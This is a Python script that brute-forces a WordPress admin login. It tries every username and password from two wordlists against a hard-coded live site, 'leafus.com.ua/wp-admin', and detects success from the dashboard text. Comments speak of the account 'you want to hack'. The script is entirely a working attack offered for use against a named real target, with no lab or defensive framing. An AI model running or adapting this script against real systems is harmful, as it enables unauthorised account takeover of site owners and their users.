import requests
from loginform import fill_login_form


# The link of the website
# url = input("\nEnter URL:")
url = "http://leafus.com.ua/wp-admin"

# Getting list of potentials password
passwords = open('passwords.txt').readlines()
# Getting list of user to test with
users = open('users.txt').readlines()

print(f"Connecting to: {url}......\n")
# Put the target email you want to hack
#user_email = input("\nEnter EMAIL / USERNAME of the account you want to hack:")
failed_aftertry = 0
for user in users:
    for password in passwords:

        # get html of the page and retreive POST DATA (login, password fields, hidden fields, post url)
        r = requests.get(url)
        fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))

        # POST URL
        post_url = fillings[-2:-1][0]
        print(f"{user}: {password}")
        payload = dict(fillings[:-2][0])
        with requests.Session() as s:
            res = requests.get(url)
            cookies = dict(res.cookies)
            p = s.post(post_url, data=payload, verify=False, cookies=cookies)
            if 'Майстерня' in p.text:
                print('logged in!!')
            else:
                print('wrong password')

Just_to_pause_the_script = input("\n.")